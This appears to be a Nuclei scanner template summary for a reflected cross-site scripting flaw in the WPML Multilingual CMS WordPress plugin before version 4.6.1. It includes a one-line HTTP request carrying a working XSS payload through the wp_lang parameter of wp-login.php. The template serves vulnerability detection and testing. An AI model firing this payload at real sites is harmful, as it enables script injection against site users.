# Nuclei Template: WordPress WPML Multilingual CMS < 4.6.1 - Cross-Site Scripting
**Template ID:** wpml-multilingual-cms-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** High
**CWE:** CWE-79
**Source:** Nuclei Template (`wpml-multilingual-cms-xss.yaml`)

## Vulnerability Information & PoC

## Description
The WPML Multilingual CMS plugin for WordPress is vulnerable to Reflected Cross-Site Scripting (XSS) in versions prior to 4.6.1. The plugin does not escape some URL attributes before outputting them to a page, allowing attackers to inject malicious JavaScript which may be executed in the browser of an unsuspecting user.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/wp-login.php?wp_lang=%20=id=x+type=image%20id=xss%20onfoc<!>usin+alert(`document.domain`)%0c
```

## References
- https://wpscan.com/vulnerability/b9cc519c-7ec2-42c3-9f42-01e928e12139/
